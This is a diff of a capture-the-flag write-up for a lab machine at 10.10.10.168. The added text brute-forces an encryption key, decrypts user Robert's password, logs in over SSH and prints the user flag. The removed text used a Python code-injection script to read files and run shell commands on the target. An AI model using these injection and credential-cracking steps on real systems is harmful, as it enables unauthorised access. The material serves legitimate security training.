@@ -70,20 +70,33 @@ robert@10.10.10.168's password:
 Permission denied, please try again.
 ```
 
-### Time to enumerate more...
+### Decrypting **Robert's password**
+
+The file **SuperSecureCrypt.sh** shows us how Robert encrypted his password.
+We can bruteforce the key used to encrypt with the script **lab/break.py** :
 
 ```
-$ python3 lab/inject.py "open('/home/robert/check.txt','r').read()" 
-
-Encrypting this file with your key should result in out.txt
-make sure your key is correct! 
-
-$ python3 lab/inject.py "open('/home/robert/out.txt','r').read()"
-
- ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
-
-$ python3 lab/inject.py "os.popen('ls -l /home/robert/BetterSSH').readlines()"
-
-['total 4'
- '-rwxr-xr-x 1 root root 1805 Oct  5 13:09 BetterSSH.py']
+$ python3 break.py 
+alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
 ```
+* The key used to encrypt is **alexandrovich**
+
+```
+echo "´ÑÈÌÉàÙÁÑé¯·¿k" > to_decrypt.txt
+```
+
+Then we decrypt it : 
+
+![security...](images/password_decrypt.png)
+
+Password : **SecThruObsFTW**
+
+```
+$ ssh robert@10.10.10.168
+robert@obscure:~$ cat user.txt
+e4493782066b55fe2755708736ada2d7
+```
+
+Owned user !
+
+## BetterSSH, really ?
